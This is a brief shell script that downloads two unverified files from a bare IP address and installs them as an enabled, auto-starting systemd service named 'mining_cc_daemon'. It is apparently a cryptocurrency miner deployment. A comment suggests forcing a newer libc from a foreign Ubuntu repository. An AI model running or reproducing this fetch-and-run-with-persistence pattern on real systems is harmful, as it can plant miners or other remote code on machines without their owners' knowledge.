wget http://100.96.210.95:4999/linux/download_deamon
wget http://100.96.210.95:4999/linux/download_deamon_service

mv download_deamon daemon_main
mv download_deamon_service /etc/systemd/system/mining_cc_daemon.service

chmod +x daemon_main
systemctl enable mining_cc_daemon.service
systemctl start mining_cc_daemon.service

# if not GLIBC >=2.34 -> apt update && apt upgrade -y && echo "deb http://archive.ubuntu.com/ubuntu jammy main" >> /etc/apt/sources.list && apt update && apt install tmux -y && apt install libc6 -y